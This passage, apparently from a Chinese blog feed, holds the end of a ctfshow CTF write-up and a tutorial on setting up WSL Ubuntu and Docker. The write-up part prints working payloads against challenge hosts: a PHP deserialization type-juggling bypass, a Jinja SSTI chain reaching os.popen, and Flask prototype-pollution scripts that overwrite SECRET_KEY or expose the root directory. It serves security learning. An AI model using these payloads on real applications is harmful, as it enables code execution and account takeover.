invoke__">strlen</span>(<span class="variable">$dsb</span>) &lt;= <span class="number">3</span>) &amp;&amp; (<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;ctf) &lt;= <span class="number">3</span>)) &#123;</span><br><span class="line">                   <span class="keyword">if</span> ((<span class="variable">$dsb</span> !== <span class="variable language_">$this</span>-&gt;ctf) &amp;&amp; (<span class="variable language_">$this</span>-&gt;ctf !== <span class="variable">$dsb</span>)) &#123;</span><br><span class="line">                       <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$dsb</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ctf)) &#123;</span><br><span class="line">                           <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;dsbctf&quot;</span>]); </span><br></pre></td></tr></table></figure><blockquote><p>代码审计，发现需要传两个md5值相同的不同字符串，有长度限制不能进行强碰撞，尝试数组绕过也不行，这里注意到可以让其类型不同而值相同进行绕过，构造 pop 链</p></blockquote><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow &#123;</span><br><span class="line">        private <span class="variable">$d</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        private <span class="variable">$s</span> = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        private <span class="variable">$b</span> = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">        private <span class="variable">$ctf</span> = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">        public <span class="keyword">function</span> __destruct() &#123;</span><br><span class="line">            <span class="variable">$this-</span>&gt;d = <span class="built_in">(string</span>)<span class="variable">$this-</span>&gt;d;</span><br><span class="line">            <span class="variable">$this-</span>&gt;s = <span class="built_in">(string</span>)<span class="variable">$this-</span>&gt;s;</span><br><span class="line">            <span class="variable">$this-</span>&gt;b = <span class="built_in">(string</span>)<span class="variable">$this-</span>&gt;b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new ctfshow();</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br><span class="line">//O<span class="meta">%3A7</span><span class="meta">%3A</span><span class="meta">%22ctfshow</span><span class="meta">%22</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A10</span><span class="meta">%3A</span><span class="meta">%22</span><span class="meta">%00ctfshow</span><span class="meta">%00d</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%221</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A10</span><span class="meta">%3A</span><span class="meta">%22</span><span class="meta">%00ctfshow</span><span class="meta">%00s</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%222</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A10</span><span class="meta">%3A</span><span class="meta">%22</span><span class="meta">%00ctfshow</span><span class="meta">%00b</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%223</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A12</span><span class="meta">%3A</span><span class="meta">%22</span><span class="meta">%00ctfshow</span><span class="meta">%00ctf</span><span class="meta">%22</span><span class="meta">%3Bi</span><span class="meta">%3A123</span><span class="meta">%3B</span><span class="meta">%7D</span></span><br></pre></td></tr></table></figure><blockquote><p>GET传入得到flag：ctfshow{ee28d4d9-8c54-4dc2-a1c4-5682bbbbe119}</p></blockquote><h2 id="ezzz-ssti"><a href="#ezzz-ssti" class="headerlink" title="ezzz_ssti"></a>ezzz_ssti</h2><blockquote><p>考点：ssti漏洞长度绕过</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241115134810233.png" alt="image-20241115134810233"></p><blockquote><p>输入111看看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241115134844072.png" alt="image-20241115134844072"></p><blockquote><p>猜测存在ssti漏洞，所以用16验证，发现确实存在</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241115134947551.png" alt="image-20241115134947551"></p><blockquote><p>于是进行ssti漏洞注入，发现进行了字数限制，经过测试，发现限制在了40个字符以内</p><p>可以利用全局变量进行绕过，最后构造 payload</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.update(a=config.update)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.a(f=lipsum.__globals__)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.a(o=config.f.os)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> <span class="attribute">x</span>=config.a(p=config.o.popen)%&#125;</span><br><span class="line">&#123;&#123;config.p(<span class="string">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241115140002044.png" alt="image-20241115140002044"></p><blockquote><p>ctfshow{89f67afc-5d2b-4de4-b700-2aaaa7428a7c}</p></blockquote><h2 id="ez-inject"><a href="#ez-inject" class="headerlink" title="ez_inject"></a>ez_inject</h2><blockquote><p>考点：原型链污染</p><p>打开网页，发现是个登录窗口</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125144046562.png" alt="image-20241125144046562"></p><blockquote><p>先随便注册登录一下看看。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125144209368.png" alt="image-20241125144209368"></p><blockquote><p>根据提示，知道在注册的地方可以进行原型链污染。</p><p>先看看cookie</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125144334162.png" alt="image-20241125144334162"></p><blockquote><p>不是admin。而且这是flask的session，我们也不知道密码。</p><p>所以原型链污染直接将密码改变，然后根据密码自己构造一个session。</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3b4e7805-6cda-4195-8501-75be8c9d1787.challenge.ctf.show/register&quot;</span></span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;wi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;wi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET_KEY&quot;</span>: <span class="string">&quot;baozongwi&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="attribute">url</span>=url, <span class="attribute">json</span>=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><blockquote><p>剩下的就是ssti注入，这是预期解</p><p>还有非预期解，直接原型链污染将静态目录污染成根目录，然后访问/static/flag就能拿到flag</p></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> <span class="type">json</span></span><br><span class="line"></span><br><span class="line">url = &quot;https://d3dbdfcc-6bba-49fa-b4b5-6c5e00484791.challenge.ctf.show/register&quot;</span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    &quot;username&quot;: &quot;test&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;test&quot;,</span><br><span class="line">    &quot;__init__&quot;: &#123;</span><br><span class="line">        &quot;__globals__&quot;: &#123;</span><br><span class="line">            &quot;app&quot;: &#123;</span><br><span class="line">                &quot;_static_folder&quot;:&quot;/&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, <span class="type">json</span>=payload,verify=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><blockquote><p>ctfshow{ad2c0de5-a09a-41d1-ac6a-546b0bf5ca3f}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wsl配置ubuntu22.04，并配置docker</title>
      <link href="/posts/ca6bf5ec.html"/>
      <url>/posts/ca6bf5ec.html</url>
      
        <content type="html"><![CDATA[<h1 id="wsl配置ubuntu22-04，并配置docker"><a href="#wsl配置ubuntu22-04，并配置docker" class="headerlink" title="wsl配置ubuntu22.04，并配置docker"></a>wsl配置ubuntu22.04，并配置docker</h1><p>[TOC]</p><h2 id="一、在Windows上安装Linux子系统"><a href="#一、在Windows上安装Linux子系统" class="headerlink" title="一、在Windows上安装Linux子系统"></a>一、在Windows上安装Linux子系统</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol><li><p>windows机器需要支持虚拟化，并且需要在BIOS中开启虚拟化技术，因为WSL2基于hyper-V。<br><strong>查看是否开启虚拟化</strong><br>按住<code>Windows+R</code>输入<code>cmd</code>打开命令行，输入</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">systeminfo</span></span><br></pre></td></tr></table></figure><p>可以看到如下字样，代表电脑已经支持虚拟化，可继续安装</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Hyper-V 要求</span><span class="punctuation">:</span> <span class="string">    虚拟机监视器模式扩展: 是</span></span><br><span class="line">                  <span class="attribute">固件中已启用虚拟化</span><span class="punctuation">:</span> <span class="string">是</span></span><br><span class="line">                  <span class="attribute">二级地址转换</span><span class="punctuation">:</span> <span class="string">是</span></span><br><span class="line">                  <span class="attribute">数据执行保护可用</span><span class="punctuation">:</span> <span class="string">是</span></span><br></pre></td></tr></table></figure></li><li><p>无论是Windows10还是Windows11，所使用的Windows是最新版的，如果不是最新版，请在<code>设置</code>-<code>Windows更新</code>中将系统更新到最新版本</p></li></ol><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ol><li><p>开启开发者模式</p></li><li><p>开启“适用于Linux的Windows子系统”：</p><p>找到 控制面板<code>-</code>程序和功能<code>-</code>启用或关闭Windows功能，选中“适用于Linux的Windows子系统”和“虚拟机平台”，然后点击确定。需要重启电脑。</p></li><li><p><a href="https://so.csdn.net/so/search?q=安装Linux&amp;spm=1001.2101.3001.7020">安装Linux</a>分发版：</p><ol><li><p>没有wsl的：下载Linux内核更新包，<a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">适用于 x64 计算机的 WSL2 Linux 内核更新包</a>，安装。</p></li><li><p>有wsl的：直接终端输入</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl <span class="comment">--update</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>启用虚拟机功能</p><p>安装 WSL 2 之前，必须启用“虚拟机平台”可选功能。 计算机需要虚拟化功能才能使用此功能。<br>以管理员身份打开<code>PowerShell</code>并运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure><p>这时需要重启电脑，等待电脑重新启动完成即可。</p></li><li><p>将 WSL 2 设置为默认版本</p><p>打开 <code>PowerShell</code>，然后在安装新的 Linux 发行版时运行以下命令，将 WSL 2 设置为默认版本：</p></li></ol><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --<span class="keyword">set</span>-<span class="keyword">default</span>-version <span class="number">2</span></span><br></pre></td></tr></table></figure><ol><li><p>安装ubuntu22.04版本 </p><p>直接在微软商店搜索ubuntu22.04，下载完成就行</p></li><li><p>运行</p><p>在开始菜单可以看到刚刚下载好的ubuntu22.04版本，直接双击运行，会提示输账户和密码，输入后就i能进去。（不输入就是默认root用户，需要自己添加账户）</p><p>此时可以在<code>此电脑</code>中看到<code>Linux</code>，打开它可以看到Ubuntu的文件，后续与Ubuntu之间的文件操作可以从此处进行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241114125151098.png" alt="image-20241114125151098"></p></li></ol><p>安装步骤就完成了。</p><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><p>１. 创建用户目录<br>注意：登录到root用户．假如你之前没有设置过root用户，那么你就通过以下命令更改密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> passwd root</span><br></pre></td></tr></table></figure><p>然后登录root:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">su root</span></span><br></pre></td></tr></table></figure><ol><li>创建新用户：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> useradd -r -m -s /bin/bash username。 <span class="comment">#username改成你的用户名</span></span><br></pre></td></tr></table></figure><p>在 Ubuntu18.04 中，不会在创建用户的时候自动提示设置密码。需要手动执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> passwd username</span><br></pre></td></tr></table></figure><p>来设置新用户的密码。</p><p>其中参数的意义如下：<br>-r：建立系统账号<br>-m：自动建立用户的登入目录<br>-s：指定用户登入后所使用的shell</p><p>输入ls /home/，可以看到用户目录被成功创建了。</p><ol><li>修改用户权限(添加root权限）<br>这里采用修改/etc/sudoers文件的方法分配用户权限。因为此文件只有r权限，在改动前需要增加w权限，改动后，再去掉w权限。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> +w /etc/sudoers</span><br><span class="line"><span class="built_in">sudo</span> vim /etc/sudoers</span><br><span class="line"></span><br><span class="line">添加下图的配置语句，并且保存修改</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> -w /etc/sudoers</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c70b3418531a2b054405bca0d0fbf720.png" alt="在这里插入图片描述"></p><p>到此，新用户创建成功，并且用户目录被创建，权限也分配成功。</p><h2 id="二、wsl安装系统到其他盘"><a href="#二、wsl安装系统到其他盘" class="headerlink" title="二、wsl安装系统到其他盘"></a>二、wsl安装系统到其他盘</h2><p>因为默认是安装ubuntu在C盘，那我一般不喜欢在C盘装软件，所以把ubuntu该到了D盘。</p><h4 id="①查看wsl运行状态，将其保持在关闭状态"><a href="#①查看wsl运行状态，将其保持在关闭状态" class="headerlink" title="①查看wsl运行状态，将其保持在关闭状态"></a>①查看wsl运行状态，将其保持在关闭状态</h4><p>在powershell中输入代码：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wsl -l -v</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-7286f01d5c6deb9b.png" alt="img"></p><p>图中STATE显示Running，就需要使用</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl <span class="comment">--shutdown</span></span><br></pre></td></tr></table></figure><p>将其关闭，再次使用”wsl -l -v”确认状态</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-0af870c67ab12a06.png" alt="img"></p><p>发现已经不在运行了</p><h4 id="②导出当前Linux的镜像"><a href="#②导出当前Linux的镜像" class="headerlink" title="②导出当前Linux的镜像"></a>②导出当前Linux的镜像</h4><p>在D盘根目录创建了新文件夹“Ubuntu2204”作为之后ubuntu的安装位置</p><p>在Powershell中输入代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wsl</span> --export Ubuntu-<span class="number">22</span>.<span class="number">04</span> H:\ubuntu22.<span class="number">04</span>.tar </span><br></pre></td></tr></table></figure><p>其中，”Ubuntu-22.04”是使用”wsl -l -v”查看到的linux系统的名字和版本，“D:\ubuntu22.04.tar ”是在H盘的根目录下创建名为“ubuntu22.04.tar”的镜像</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-a7306ecc0d00b8be.png" alt="img"></p><h4 id="③注销之前的系统并检查"><a href="#③注销之前的系统并检查" class="headerlink" title="③注销之前的系统并检查"></a>③注销之前的系统并检查</h4><p>Powershell中输入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wsl</span> --unregister Ubuntu-<span class="number">22</span>.<span class="number">04</span></span><br></pre></td></tr></table></figure><p>再通过“wsl -l -v”，发现子系统已删除</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-d2fb4376a29eb1df.png" alt="img"></p><h4 id="④导入镜像"><a href="#④导入镜像" class="headerlink" title="④导入镜像"></a>④导入镜像</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">wsl</span> --import Ubuntu-<span class="number">22</span>.<span class="number">04</span> D:\Ubuntu2004 D:\ubuntu20.<span class="number">04</span>.tar </span><br></pre></td></tr></table></figure><p>Ubuntu-22.04    Linux系统名称和版本<br> D:\Ubuntu2204  安装路径<br> D:\ubuntu22.04.tar 镜像所在位置<br> 等待系统处理，在文件夹中看到vhdx文件即为导入成功</p><h4 id="⑤配置先前设置的默认登录用户"><a href="#⑤配置先前设置的默认登录用户" class="headerlink" title="⑤配置先前设置的默认登录用户"></a>⑤配置先前设置的默认登录用户</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu2204.exe config --default-<span class="keyword">user</span> <span class="title">username</span></span><br></pre></td></tr></table></figure><p>username替换成你先前输入的账户名，可以替换为root<br>至此ubuntu22.04迁移完成~！</p><h2 id="三、配置docker和docker-compose"><a href="#三、配置docker和docker-compose" class="headerlink" title="三、配置docker和docker-compose"></a>三、配置docker和docker-compose</h2><h3 id="Wsl2中的Ubuntu22-04安装Docker"><a href="#Wsl2中的Ubuntu22-04安装Docker" class="headerlink" title="Wsl2中的Ubuntu22.04安装Docker"></a>Wsl2中的Ubuntu22.04安装Docker</h3><blockquote><p>友情提示：确定为wsl2+ubuntu22.04，否则可能按照以下步骤会失败。若失败，请完全卸载后重装docker，并检查wsl版本</p></blockquote><p>安装依赖包</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sudo</span> apt install apt-trans<span class="keyword">port</span>-https ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure><p>添加阿里云镜像源和密钥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/docker-ce/</span>linux<span class="regexp">/ubuntu/g</span>pg | sudo gpg --dearmor -o <span class="regexp">/usr/</span>share<span class="regexp">/keyrings/</span>docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure><p>添加阿里云镜像源和密钥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/docker-ce/</span>linux<span class="regexp">/ubuntu/g</span>pg | sudo gpg --dearmor -o <span class="regexp">/usr/</span>share<span class="regexp">/keyrings/</span>docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure><p>添加阿里云镜像源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure><p>从软件源中更新安装工具包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt uograde</span><br></pre></td></tr></table></figure><p>安装Docker套件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-<span class="keyword">ce</span> docker-<span class="keyword">ce</span>-cli containerd.io</span><br></pre></td></tr></table></figure><p>安装docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install docker-compose</span><br></pre></td></tr></table></figure><p>验证安装是否成功</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="comment">--version</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241114130614313.png" alt="image-20241114130614313"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose <span class="comment">--version</span></span><br></pre></td></tr></table></figure><p>启动docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> service docker start</span><br></pre></td></tr></table></figure><h3 id="docker指令必须用sudo执行"><a href="#docker指令必须用sudo执行" class="headerlink" title="docker指令必须用sudo执行"></a>docker指令必须用sudo执行</h3><p>默认情况下， Unix 套接字 (Unix socket)由用户 root 拥有，其他用户只能使用 sudo 访问它。 Docker 守护进程始终以 root 用户身份运行。</p><p>为了避免每次都加sudo，需要给现在的账户添加docker权限</p><p>创建Docker用户组</p><p>通常在安装 Docker 时会自动创建一个名为 docker 的用户组，但可以手动确保其存在：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> groupadd docker</span><br></pre></td></tr></table></figure><p>将当前用户添加到docker 组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$USER</span></span><br></pre></td></tr></table></figure><h3 id="配置Docker镜像源"><a href="#配置Docker镜像源" class="headerlink" title="配置Docker镜像源"></a>配置Docker镜像源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.创建Docker文件夹</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">2.写入个人镜像源</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://ud6340vz.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">3.重启守护进程和docker引擎</span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure><p>测试镜像源配置成功</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull hello-world</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/02162cf0dc8f48ad944b284e0c5cca0d.png" alt="img"></p><p>其他镜像源加速地址:</p><p>Docker 中国官方镜像    <a href="https://registry.docker-cn.com">https://registry.docker-cn.com</a><br>DaoCloud 镜像站    <a href="http://f1361db2.m.daocloud.io">http://f1361db2.m.daocloud.io</a><br>Azure 中国镜像    <a href="https://dockerhub.azk8s.cn">https://dockerhub.azk8s.cn</a><br>科大镜像站    <a href="https://docker.mirrors.ustc.edu.cn">https://docker.mirrors.ustc.edu.cn</a><br>阿里云    <a href="https://ud6340vz.mirror.aliyuncs.com">https://ud6340vz.mirror.aliyuncs.com</a><br>七牛云    <a href="https://reg-mirror.qiniu.com">https://reg-mirror.qiniu.com</a><br>网易云(常用)    <a href="https://hub-mirror.c.163.com">https://hub-mirror.c.163.com</a><br>腾讯云    <a href="https://mirror.ccs.tencentyun.com">https://mirror.ccs.tencentyun.com</a></p><h2 id="四、docker-pull-报错Get-“https-registry-1-docker-io-v2-“-net-http-request-canceled-while-waiting-for-connection-Client-Timeout-exceeded-while-awaiting-headers-解决方法"><a href="#四、docker-pull-报错Get-“https-registry-1-docker-io-v2-“-net-http-request-canceled-while-waiting-for-connection-Client-Timeout-exceeded-while-awaiting-headers-解决方法" class="headerlink" title="四、docker pull 报错Get “https://registry-1.docker.io/v2/“: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)解决方法"></a>四、docker pull 报错Get “<a href="https://registry-1.docker.io/v2/">https://registry-1.docker.io/v2/</a>“: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)解决方法</h2><p>配置加速地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>docker/daemon.json</span><br></pre></td></tr></table></figure><p>添加以下内容</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.1panel.live&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 